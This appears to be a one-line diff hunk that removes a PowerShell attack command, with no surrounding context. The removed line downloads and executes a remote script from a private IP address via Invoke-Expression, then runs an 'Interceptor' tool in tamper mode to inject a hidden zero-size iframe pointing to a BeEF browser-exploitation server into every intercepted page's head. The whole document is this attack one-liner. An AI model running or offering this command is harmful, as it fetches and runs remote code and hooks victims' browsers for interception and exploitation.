@@ -1,1 +1,0 @@
-iex (New-Object Net.WebClient).DownloadString('http://192.168.3.202/pntdr/link/interceptor.ps1'); Interceptor.ps1 -Tamper -SearchString "</head>" -ReplaceString "<iframe src=beefserver.com height=0 width=0></iframe></head>"
